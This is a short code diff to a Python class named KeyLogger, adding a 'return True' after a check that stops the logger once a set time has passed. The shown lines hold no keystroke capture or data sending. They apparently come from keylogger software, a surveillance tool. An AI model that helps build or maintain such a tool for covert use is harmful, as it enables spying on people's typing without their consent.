@@ -45,6 +45,7 @@ class KeyLogger:
         if self.currentTime > self.stoppingTime:
             self.after_stop()
             return False
+        return True
 
     def after_stop(self):
         self.number_of_iterations += 1
